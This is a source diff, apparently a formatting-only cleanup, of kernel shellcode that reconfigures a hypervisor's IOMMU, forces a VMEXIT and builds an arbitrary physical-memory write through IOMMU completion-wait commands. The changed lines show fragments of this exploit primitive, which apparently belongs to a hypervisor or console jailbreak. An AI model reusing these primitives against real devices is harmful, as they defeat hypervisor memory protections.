@@ -48,7 +48,7 @@ __attribute__((section(".entry_point"))) uint32_t main(uint64_t add1,
   // Reconfigure IOMMU calling the HV
   int ret = ((uint64_t(*)(uint64_t, uint64_t, uint64_t, uint64_t,
                           int *))args_ptr->fun_hv_iommu_set_buffers)(
-      iommu_cb2_pa, iommu_cb3_pa, iommu_eb_pa, (uint64_t) &unk, &n_devices);
+      iommu_cb2_pa, iommu_cb3_pa, iommu_eb_pa, (uint64_t)&unk, &n_devices);
 
   if (ret != 0) {
     putc_uart(args_ptr->dmap_base, 'I');
@@ -119,7 +119,7 @@ __attribute__((section(".entry_point"))) uint32_t main(uint64_t add1,
     // Re-do this to force a VMEXIT without HV injecting faults
     ((uint64_t(*)(uint64_t, uint64_t, uint64_t, uint64_t,
                   int *))args_ptr->fun_hv_iommu_set_buffers)(
-        iommu_cb2_pa, iommu_cb3_pa, iommu_eb_pa, (uint64_t) &unk, &n_devices);
+        iommu_cb2_pa, iommu_cb3_pa, iommu_eb_pa, (uint64_t)&unk, &n_devices);
     ((uint64_t(*)(void))args_ptr->fun_hv_iommu_wait_completion)();
 
     putc_uart(args_ptr->dmap_base, 'B');
@@ -198,8 +198,8 @@ iommu_submit_cmd(volatile shellcode_kernel_args *args_ptr, uint64_t *cmd) {
                        IOMMU_CB_MASK; // Offset in IOMMU Command Buffer
 
   // We write the command in the current empty entry
-  uint64_t *cmd_buffer =
-      (uint64_t *)args_ptr->iommu_cb2_va + curr_tail / 8; // Downscale the size of the ptr
+  uint64_t *cmd_buffer = (uint64_t *)args_ptr->iommu_cb2_va +
+                         curr_tail / 8; // Downscale the size of the ptr
   // Copy 0x10 bytes (CMD Size)
   cmd_buffer[0] = cmd[0];
   cmd_buffer[1] = cmd[1];
@@ -217,7 +217,8 @@ iommu_submit_cmd(volatile shellcode_kernel_args *args_ptr, uint64_t *cmd) {
 
 // Write 8 bytes to a physical address using IOMMU completion wait store
 __attribute__((noinline, optimize("O0"))) void
-iommu_write8_pa(volatile shellcode_kernel_args *args_ptr, uint64_t pa, uint64_t val) {
+iommu_write8_pa(volatile shellcode_kernel_args *args_ptr, uint64_t pa,
+                uint64_t val) {
   uint32_t cmd[4] = {0};
   cmd[0] = (uint32_t)(pa & 0xFFFFFFF8) | 0x05;
   cmd[1] = ((uint32_t)(pa >> 32) & 0xFFFFF) | 0x10000000;
@@ -278,13 +279,13 @@ void init_global_pointers(volatile shellcode_kernel_args *args_ptr) {
 
   memcpy(&args, (void *)args_ptr, sizeof(args));
 
-  printf = (void (*)(const char *, ...)) args.fun_printf;
-  smp_rendezvous = (void (*)(void (*)(void), void (*)(void),
-                       void (*)(void), void *)) args.fun_smp_rendezvous;
-  smp_no_rendevous_barrier = (void (*)(void)) args.fun_smp_no_rendevous_barrier;
+  printf = (void (*)(const char *, ...))args.fun_printf;
+  smp_rendezvous = (void (*)(void (*)(void), void (*)(void), void (*)(void),
+                             void *))args.fun_smp_rendezvous;
+  smp_no_rendevous_barrier = (void (*)(void))args.fun_smp_no_rendevous_barrier;
 
-  transmitter_control = (int (*) (int, void*)) args.fun_transmitter_control;
-  mp3_initialize = (int (*) (int)) args.fun_mp3_initialize;
-  mp3_invoke = (int (*) (int, void*, void*)) args.fun_mp3_invoke;
+  transmitter_control = (int (*)(int, void *))args.fun_transmitter_control;
+  mp3_initialize = (int (*)(int))args.fun_mp3_initialize;
+  mp3_invoke = (int (*)(int, void *, void *))args.fun_mp3_invoke;
   g_vbios = args.g_vbios;
 }
